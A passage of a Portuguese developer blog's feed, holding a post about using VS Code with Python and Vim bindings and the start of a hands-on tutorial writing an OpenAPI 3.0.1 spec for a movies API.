uma excelente ferramenta para desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Piadas à parte, ainda acho o &lt;em&gt;Vim&lt;/em&gt; uma …&lt;/p&gt;</summary><content type="html">&lt;p&gt;É, caro leitor... chegou o dia de admitir que tenho usado outro editor
além do &lt;a href="https://klauslaube.com.br/tag/vim.html" title="Leia mais sobre o melhor editor do universo"&gt;&lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;. Pode
me julgar, me chamar de "poser" ou de "vendido", mas acontece que tenho descoberto no
&lt;a href="https://code.visualstudio.com/" title="Conheça o VS Code"&gt;&lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt;, da &lt;em&gt;Microsoft&lt;/em&gt;,
uma excelente ferramenta para desenvolvimento &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Piadas à parte, ainda acho o &lt;em&gt;Vim&lt;/em&gt; uma ferramenta fantástica. Mas também
reconheço que há uma curva de aprendizagem, e que montar um set de &lt;em&gt;plugins&lt;/em&gt; para
um determinado ambiente de desenvolvimento pode ser uma tarefa maçante (sim,
eu estou olhando para você, &lt;code&gt;python-mode&lt;/code&gt;). Nisso, tenho que reconhecer
que o &lt;em&gt;Visual Studio Code&lt;/em&gt; faz um trabalho primoroso.&lt;/p&gt;
&lt;h2&gt;Motivação&lt;/h2&gt;
&lt;p&gt;Tenho "advogado" contra o uso de &lt;em&gt;IDEs&lt;/em&gt; &lt;a href="https://www.profissionaisti.com.br/2009/01/produtividade-x-programacao-voce-realmente-precisa-de-uma-ide/" title="Produtividade x Programação: Você realmente precisa de uma IDE?"&gt;desde 2009&lt;/a&gt;.
De lá para cá, geralmente trabalhei com ambientes relativamente fáceis de lidar, como
&lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;.
Essa opinião mudou a partir do momento que comecei a desenvolver para &lt;em&gt;Android&lt;/em&gt;. Não digo
que usar editores de texto (como o &lt;em&gt;Vim&lt;/em&gt; ou &lt;em&gt;Emacs&lt;/em&gt;) para desenvolver &lt;em&gt;Java/Android&lt;/em&gt; seja
impossível, mas (IMO) beira o masoquismo. Com o &lt;em&gt;Android Studio&lt;/em&gt;, por exemplo, muitas barreiras
de &lt;em&gt;setup&lt;/em&gt; de ambiente são derrubadas pela ferramenta, aumentando produtividade e diminuindo
o tempo necessário para ter a sua solução funcionando no dispositivo do seu usuário.&lt;/p&gt;
&lt;h2&gt;IDE pero no mucho&lt;/h2&gt;
&lt;p&gt;Além de ser livre e de código-aberto, o &lt;em&gt;Visual Studio Code&lt;/em&gt; é leve, extensível e &lt;a href="https://github.com/Microsoft/vscode" title="Veja o repositório do vscode no Github"&gt;construído
em &lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;. Ele funciona "out of the box" para linguagens como &lt;a href="https://klauslaube.com.br/tag/css.html" title="Leia mais sobre CSS"&gt;&lt;em&gt;CSS&lt;/em&gt;&lt;/a&gt;, &lt;em&gt;Javascript&lt;/em&gt; e &lt;em&gt;HTML&lt;/em&gt;,
inclusive, é impressionante como o &lt;em&gt;autocomplete&lt;/em&gt; (através do
&lt;a href="https://code.visualstudio.com/docs/editor/intellisense" title="Leia mais sobre o IntelliSense"&gt;&lt;em&gt;IntelliSense&lt;/em&gt;&lt;/a&gt;) funciona
"smoothly" para as mesmas.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/lando-traidor.jpg" width="640" height="277" title="Tô traindo o movimento tipo o Lando (theplaylist.net)" alt="Tô traindo o movimento tipo o Lando (theplaylist.net)"&gt;&lt;/p&gt;
&lt;p&gt;O seu &lt;em&gt;marketplace&lt;/em&gt; de &lt;em&gt;plugins&lt;/em&gt; é rico, e é sem dúvida um dos seus
pontos fortes. Adicionar &lt;em&gt;code formatters&lt;/em&gt;, &lt;em&gt;autocomplete&lt;/em&gt;, ou integrações com ferramentas
externas nunca foi tão fácil. Além disso, a opção de customizar o editor
globalmente ou por &lt;em&gt;workspace&lt;/em&gt; é uma mão na roda para quem trabalha com mais de um projeto no cotidiano.&lt;/p&gt;
&lt;p&gt;Utilitários de &lt;em&gt;refactoring&lt;/em&gt;, &lt;em&gt;debugging&lt;/em&gt;, controle de versão, além dos inúmeros &lt;em&gt;plugins&lt;/em&gt; para &lt;em&gt;tests&lt;/em&gt;, só aumentam
ainda mais o poderio do editor, e dão a ele esse "jeitão" de &lt;em&gt;IDE&lt;/em&gt;, sem perder
a simplicidade peculiar dos editores de texto.&lt;/p&gt;
&lt;h2&gt;Python&lt;/h2&gt;
&lt;p&gt;Para usar o editor com &lt;em&gt;Python&lt;/em&gt;, a &lt;a href="https://marketplace.visualstudio.com/items?itemName=ms-python.python" title="Python for VS Code"&gt;extensão criada pela própria &lt;em&gt;Microsoft&lt;/em&gt;&lt;/a&gt;
deve ser o suficiente. Ela é simples de configurar e muito rica, trazendo comandos interessantes como
&lt;code&gt;Start REPL&lt;/code&gt; ou &lt;code&gt;Run all unit tests&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vscode-python-example.png" width="640" height="320" title="VS Code com Python" alt="VS Code com Python"&gt;&lt;/p&gt;
&lt;p&gt;A configuração granular do editor permite que você tenha um determinado conjunto de regras para
cada projeto que esteja envolvido. Por exemplo, em um projeto pessoal você usa &lt;code&gt;nose&lt;/code&gt; como
&lt;em&gt;test runner&lt;/em&gt;, além de &lt;code&gt;pylamas&lt;/code&gt; e &lt;code&gt;mypy&lt;/code&gt;. Mas no projeto da sua empresa o padrão é
&lt;code&gt;pytest&lt;/code&gt;, &lt;code&gt;isort&lt;/code&gt;, e a única ferramenta de &lt;em&gt;lint&lt;/em&gt; é o &lt;code&gt;flake8&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;python.linting.flake8Path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/home/klaus/.pyenv/versions/company-project/bin/flake8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;python.pythonPath&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/home/klaus/.pyenv/versions/company-project/bin/python&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;python.sortImports.path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/home/klaus/.pyenv/versions/company-project/bin/isort&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;&amp;quot;python.linting.pylintEnabled&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Notou o &lt;em&gt;path&lt;/em&gt; com &lt;code&gt;pyenv&lt;/code&gt;? Com a opção &lt;code&gt;python.venvPath&lt;/code&gt; apontando para o diretório do &lt;em&gt;pyenv&lt;/em&gt;,
fica muito mais conveniente configurar qual interpretador e ferramentas de &lt;em&gt;lint&lt;/em&gt; utilizar. Ao
executar o comando &lt;code&gt;Python: Select interpreter&lt;/code&gt; o &lt;em&gt;plugin&lt;/em&gt; levará em consideração os seus
ambientes virtuais e irá sugerí-los.&lt;/p&gt;
&lt;h2&gt;Vim bindings&lt;/h2&gt;
&lt;p&gt;É claro que você pode trazer umas das melhores coisas do &lt;em&gt;Vim&lt;/em&gt; para o &lt;em&gt;VS Code&lt;/em&gt;! Os &lt;em&gt;keys bindings&lt;/em&gt;
vão te dar a velocidade de escrita que você já está acostumado, e o &lt;a href="https://marketplace.visualstudio.com/items?itemName=vscodevim.vim" title="Vim emulation for Visual Studio Code"&gt;&lt;em&gt;VSCodeVim&lt;/em&gt;&lt;/a&gt; é uma excelente escolha como extensão.&lt;/p&gt;
&lt;p&gt;Obviamente que, por tratar-se de um emulador, não temos toda a experiência do &lt;em&gt;Vim&lt;/em&gt;. Para compensar a extensão já traz
algumas funcionalidades embutidas, como &lt;em&gt;easymotion&lt;/em&gt;, &lt;em&gt;surround&lt;/em&gt;, &lt;em&gt;commentary&lt;/em&gt; e &lt;em&gt;sneak&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Um dos maiores desafios que enfrentei com a adoção do &lt;em&gt;VS Code&lt;/em&gt; foi quebrar esse preconceito
bobo que todo "fanboy" tem com tecnologias que rivalizam com a sua. Na verdade, testar novas
ferramentas (como o &lt;em&gt;VS Code&lt;/em&gt;), tecnologias (como o &lt;em&gt;iOS&lt;/em&gt;) e até outras linguagens (como &lt;em&gt;Java&lt;/em&gt; e &lt;em&gt;Scala&lt;/em&gt;),
tem agregado muito ao meu crescimento profissional.&lt;/p&gt;
&lt;p&gt;E se você está torcendo o nariz para o fato do editor ser da &lt;em&gt;Microsoft&lt;/em&gt;, lembre-se:
&lt;a href="https://g1.globo.com/economia/tecnologia/noticia/microsoft-compra-github-por-us-75-bilhoes.ghtml" title="Microsoft compra GitHub por US$ 7,5 bilhões e anuncia mudanças"&gt;&lt;em&gt;Github&lt;/em&gt; também é dela&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="editores"></category><category term="ide"></category><category term="vscode"></category><category term="vim"></category><category term="python"></category><category term="css"></category><category term="javascript"></category><category term="eu-me-rendo"></category></entry><entry><title>Swagger na prática</title><link href="https://klauslaube.com.br/2018/03/15/swagger-na-pratica.html" rel="alternate"></link><published>2018-03-15T18:15:00-03:00</published><updated>2018-03-15T18:15:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2018-03-15:/2018/03/15/swagger-na-pratica.html</id><summary type="html">&lt;p&gt;Voltamos a falar de &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre APIs"&gt;&lt;em&gt;APIs&lt;/em&gt;&lt;/a&gt;, e voltamos a falar sobre especificações.
Para continuar o assunto sobre &lt;a href="https://klauslaube.com.br/2017/11/25/swagger-e-o-open-api-initiative.html" title="Swagger e o OAI"&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt;,
hoje vamos abordar o tema de uma maneira prática. Afinal, é com ela que a gente vê as principais
vantagens de utilizar &lt;em&gt;Swagger&lt;/em&gt; + &lt;em&gt;Open API Spec&lt;/em&gt;, em relação aos concorrentes.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Não deixe de …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Voltamos a falar de &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre APIs"&gt;&lt;em&gt;APIs&lt;/em&gt;&lt;/a&gt;, e voltamos a falar sobre especificações.
Para continuar o assunto sobre &lt;a href="https://klauslaube.com.br/2017/11/25/swagger-e-o-open-api-initiative.html" title="Swagger e o OAI"&gt;&lt;em&gt;Swagger&lt;/em&gt;&lt;/a&gt;,
hoje vamos abordar o tema de uma maneira prática. Afinal, é com ela que a gente vê as principais
vantagens de utilizar &lt;em&gt;Swagger&lt;/em&gt; + &lt;em&gt;Open API Spec&lt;/em&gt;, em relação aos concorrentes.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Não deixe de conferir uma abordagem prática ao &lt;a href="https://klauslaube.com.br/tag/raml.html" title="Leia mais sobre RAML"&gt;&lt;em&gt;RAML&lt;/em&gt;&lt;/a&gt;, no &lt;em&gt;post&lt;/em&gt;
"&lt;a href="https://klauslaube.com.br/2017/01/31/ramilificando-as-suas-apis.html" title="Leia o artigo completo"&gt;Ramilificando as suas APIs&lt;/a&gt;".&lt;/p&gt;
&lt;h2&gt;Aquecendo&lt;/h2&gt;
&lt;p&gt;E mais uma vez vamos usar o nosso &lt;a href="https://klauslaube.com.br/2016/05/20/rest-parte-2.html" title="REST - Parte 2"&gt;mini &lt;em&gt;IMDB&lt;/em&gt;&lt;/a&gt; como exemplo.&lt;/p&gt;
&lt;p&gt;Além disso, vamos aproveitar as ferramentas que o pessoal do &lt;em&gt;Swagger&lt;/em&gt; disponibiliza gratuitamente. A começar pelo
&lt;a href="https://swagger.io/swagger-editor/" title="API Development Tools"&gt;&lt;em&gt;Swagger Editor&lt;/em&gt;&lt;/a&gt;. Não é necessário fazer
nenhum tipo de cadastro ou instalação no momento, apenas abrir o editor através do &lt;em&gt;link&lt;/em&gt; "Online Editor".&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/poesia-vogon.jpg" width="600" height="344" title="Aguenta um pouco mais dessa poesia Vogon (imagilendo.wordpress.com)" alt="Aguenta um pouco mais dessa poesia Vogon (imagilendo.wordpress.com)"&gt;&lt;/p&gt;
&lt;p&gt;Ele trará um exemplo de especificação. Vamos limpar o editor e começar do zero.&lt;/p&gt;
&lt;h2&gt;Como começar?&lt;/h2&gt;
&lt;p&gt;Como explicado no &lt;em&gt;post&lt;/em&gt; anterior, &lt;em&gt;Swagger&lt;/em&gt; é um padrão de &lt;em&gt;API Spec&lt;/em&gt; mas também é um conjunto de ferramentas que podem trabalhar tanto com &lt;em&gt;Swagger Spec&lt;/em&gt; quanto com &lt;a href="https://github.com/OAI/OpenAPI-Specification" title="The OpenAPI Specification"&gt;&lt;em&gt;Open API Spec&lt;/em&gt;&lt;/a&gt;. Vamos começar o documento deixando clara a nossa escolha:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;openapi&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;3.0.1&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.1.md" title="Open API Spec Version 3.0.1"&gt;Confira a versão 3.0.1 do &lt;em&gt;OAI&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A essa altura o editor já deve ter apontado alguns erros. Por exemplo, é obrigatória a presença de um atributo &lt;a href="https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.1.md#infoObject" title="Veja na especificação"&gt;&lt;em&gt;info&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.1.md#pathsObject"&gt;&lt;em&gt;path&lt;/em&gt;&lt;/a&gt;. Vamos corrigí-los:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;openapi&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;3.0.1&amp;quot;&lt;/span&gt;
&lt;span class="nt"&gt;info&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movies API&lt;/span&gt;
  &lt;span class="nt"&gt;version&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;v1&lt;/span&gt;
&lt;span class="nt"&gt;paths&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;/movies&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;A set of movies&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Em &lt;code&gt;info&lt;/code&gt;, descrevemos o título da nossa &lt;em&gt;API&lt;/em&gt; e sobre qual versão da mesma estamos falando (nesse caso, &lt;code&gt;v1&lt;/code&gt;). Em &lt;code&gt;paths&lt;/code&gt;, descreveremos os &lt;em&gt;endpoints&lt;/em&gt;. Com a adição dessas duas propriedades, podemos progredir com a construção da &lt;em&gt;API&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/swagger-editor-example.png" width="640" height="152" title="Exemplo Swagger Editor" alt="Exemplo Swagger Editor"&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.1.md#openapi-object" title="Leia na especificação"&gt;Conheça os atributos do &lt;em&gt;OpenAPI Object&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Descrevendo os dados&lt;/h2&gt;
&lt;p&gt;Antes mesmo de adicionarmos os &lt;em&gt;endpoints&lt;/em&gt; na propriedade &lt;code&gt;paths&lt;/code&gt;, vamos parar e descrever o &lt;em&gt;schema&lt;/em&gt; dos nossos dados. Nesse exemplo, o uso da propriedade &lt;code&gt;components&lt;/code&gt; pode ser um "overhead", mas para &lt;em&gt;APIs&lt;/em&gt; grandes, com vários &lt;em&gt;endpoints&lt;/em&gt;, essa separação ajudará na legibilidade e reaproveitamento de código:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;paths&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;/movies&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;A set of movies&lt;/span&gt;

&lt;span class="nt"&gt;components&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;schemas&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="nt"&gt;Movie&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;properties&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
                &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
                &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;string&lt;/span&gt;
            &lt;span class="nt"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;id&lt;/span&gt;
                &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;title&lt;/span&gt;
            &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;object&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;Movie&lt;/code&gt; é um objeto e possui três propriedades: &lt;code&gt;id&lt;/code&gt;, &lt;code&gt;title&lt;/code&gt; e &lt;code&gt;description&lt;/code&gt;, e as duas primeiras são obrigatórias. Você pode estar estranhando o &lt;code&gt;id&lt;/code&gt; ser do tipo &lt;code&gt;string&lt;/code&gt;. Nesse exemplo estamos assumindo que os identificadores são &lt;code&gt;uuids&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/swagger-editor-example-2.png" width="640" height="310" title="Editor do Swagger exibindo a seção models" alt="Editor do Swagger exibindo a seção models"&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.1.md#schemaObject" title="Veja na especificação"&gt;Saiba mais sobre &lt;em&gt;Schema Objects&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Descrevendo os endpoints&lt;/h2&gt;
&lt;p&gt;Os principais &lt;em&gt;endpoints&lt;/em&gt; que imaginamos para esse projeto são:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GET /movies&lt;/code&gt;: Listagem de filmes;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;POST /movies&lt;/code&gt;: Adição de um filme;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GET /movies/{id}&lt;/code&gt;: Detalhes de um filme;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PUT /movies/{id}&lt;/code&gt;: Atualização de um filme;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DELETE /movies/{id}&lt;/code&gt;: Remoção de um filme.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A listagem é um bom ponto de partida.&lt;/p&gt;
&lt;h3&gt;Listando filmes&lt;/h3&gt;
&lt;p&gt;Voltando à propriedade &lt;code&gt;paths&lt;/code&gt;, vamos melhorar a definição do &lt;code&gt;/movies&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;paths&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="nt"&gt;/movies&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;A set of movies&lt;/span&gt;
    &lt;span class="nt"&gt;get&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
      &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Get a list of movies&lt;/span&gt;
      &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="s"&gt;&amp;#39;200&amp;#39;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Movie list response&lt;/span&gt;
          &lt;span class="nt"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;application/json&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
              &lt;span class="nt"&gt;schema&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="nt"&gt;type&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;array&lt;/span&gt;
                &lt;span class="nt"&gt;items&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                  &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;#/components/schemas/Movie&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Através do &lt;code&gt;/movies&lt;/code&gt;, dentro de &lt;code&gt;paths&lt;/code&gt;, estamos descrevendo o &lt;em&gt;endpoint&lt;/em&gt;. Com o uso de &lt;code&gt;get:&lt;/code&gt;, declaramos que o &lt;em&gt;endpoint&lt;/em&gt; aceitará o método &lt;code&gt;GET&lt;/code&gt;. Ainda abusando da indentação do &lt;em&gt;YAML&lt;/em&gt;, deixamos claro que existe uma resposta &lt;code&gt;200&lt;/code&gt; (sucesso), que o seu conteúdo é &lt;code&gt;application/json&lt;/code&gt;, e que dentro desse conteúdo haverá uma listagem de filmes.&lt;/p&gt;
&lt;p&gt;Com o &lt;code&gt;$ref&lt;/code&gt; somos capazes de referenciar um &lt;a href="https://github.com/OAI/OpenAPI-Specification/blob/master/versions/3.0.1.md#pathItemObject" title="Leia mais na especificação"&gt;&lt;em&gt;Path Item Object&lt;/em&gt;&lt;/a&gt; do próprio arquivo que estamos trabalhando (nesse caso, o &lt;code&gt;#/components/schemas/Movie&lt;/code&gt; está referência ao bloco de &lt;em&gt;YAML&lt;/em&gt; que criamos no capítulo anterior) ou até mesmo recursos externos. O que possibilita quebrar a &lt;em&gt;spec&lt;/em&gt; em diferentes arquivos.&lt;/p&gt;
&lt;p&gt;Se você já conhece o &lt;a href="http://json-schema.org/" title="a vocabulary that allows you to annotate and validate JSON documents"&gt;&lt;em&gt;JSON Schema&lt;/em&gt;&lt;/a&gt;, essa notação não lhe parecerá estranha.&lt;/p&gt;
&lt;h3&gt;Criando filmes&lt;/h3&gt;
&lt;p&gt;Ainda em &lt;code&gt;/movies&lt;/code&gt;, ao enviar um &lt;code&gt;POST&lt;/code&gt;, somos capazes de criar um novo filme. Se você já leu sobre &lt;a href="https://klauslaube.com.br/tag/rest.html" title="Leia mais sobre REST"&gt;&lt;em&gt;REST&lt;/em&gt;&lt;/a&gt; sabe que essa prática é recomendada. Vamos adicionar o seguinte bloco abaixo do &lt;code&gt;get&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

&lt;span class="l l-Scalar l-Scalar-Plain"&gt;paths&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="nt"&gt;/movies&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="l l-Scalar l-Scalar-Plain"&gt;(...)&lt;/span&gt;

        &lt;span class="l l-Scalar l-Scalar-Plain"&gt;post&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
          &lt;span class="nt"&gt;summary&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Add a new movie to the set&lt;/span&gt;
          &lt;span class="nt"&gt;requestBody&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="nt"&gt;required&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;
            &lt;span class="nt"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
              &lt;span class="nt"&gt;application/json&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="nt"&gt;schema&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                  &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;#/components/schemas/Movie&amp;#39;&lt;/span&gt;
          &lt;span class="nt"&gt;responses&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="s"&gt;&amp;#39;201&amp;#39;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
              &lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Returns the new movie&lt;/span&gt;
              &lt;span class="nt"&gt;content&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="nt"&gt;application/json&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                  &lt;span class="nt"&gt;schema&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="nt"&gt;$ref&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;#/components/schemas/Movie&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


